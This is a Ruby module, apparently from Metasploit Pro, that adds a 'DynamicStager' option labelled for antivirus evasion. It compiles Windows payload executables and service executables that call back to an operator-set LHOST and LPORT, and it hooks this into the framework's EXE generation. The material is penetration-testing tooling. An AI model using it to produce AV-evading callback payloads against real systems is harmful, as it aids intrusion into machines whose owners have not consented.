require 'pro/dynamic_stagers/dynamic_stagers'
require 'msf/core/exploit/exe'

module Pro
  module Exploit
    module DynamicEXE

      def initialize(info = {})
        super

        register_options([
          Msf::OptBool.new('DynamicStager', [ false, 'Use Dynamic C-Stager if applicable (AV evasion)', true])
        ], self.class)
      end

      # @return [String] A string form of the compiled EXE
      def generate_payload_exe(opts={})
        if datastore['DynamicStager'] and stager_type and windows_target?
          generate_dynamic_stager
        else
          super(opts)
        end
      end

      # @return [String] A string form of the compiled EXE
      def generate_payload_exe_service(opts={})
        if datastore['DynamicStager'] and stager_type and windows_target?
          generate_dynamic_stager_service
        else
          super(opts)
        end
      end

      # @return [String] A string form of the compiled EXE
      def generate_dynamic_stager
        generator = ::Pro::DynamicStagers::EXEGenerator.new(generator_opts(false))
        exe = generator.compile
        exe.encode_string('exe', false)
      end

      # @return [String] A string form of the compiled EXE
      def generate_dynamic_stager_service
        generator = ::Pro::DynamicStagers::EXEGenerator.new(generator_opts(true))
        exe = generator.compile
        exe.encode_string('exe', false)
      end


      private

      # @param service [Boolean] Whether this is a service EXE
      # @return [Hash] A hash of the Dynamic Stager Generator Options
      def generator_opts(service=false)
        {
          host: datastore['LHOST'] || '',
          stager: stager_type,
          port: datastore['LPORT'] || 4444,
          service: service
        }
      end

      # @return [String] The stager type selected for the payload
      def stager_type
        stagers = Pro::DynamicStagers::EXEGenerator::SUPPORTED_STAGERS
        stagers.find { |stager| datastore['PAYLOAD'].ends_with?(stager) }
      end

      # @return [Boolean] Returns whether the target platform is Windows
      def windows_target?
        if self.respond_to? :target_platform
          target_platform.platforms.include? Msf::Module::Platform::Windows
        else
          platform.platforms.include? Msf::Module::Platform::Windows
        end
      end

    end
  end
end

module Pro
  module Hooks
    class DynamicStagerHook

      attr_accessor :framework

      def initialize(framework)
        self.framework = framework

        return unless framework.esnecil_support_dynamic_stager?

        Msf::Exploit::EXE.send(:prepend, Pro::Exploit::DynamicEXE)
      end
    end
  end
end


Pro::Hooks::Loader.add_hook(Pro::Hooks::DynamicStagerHook)
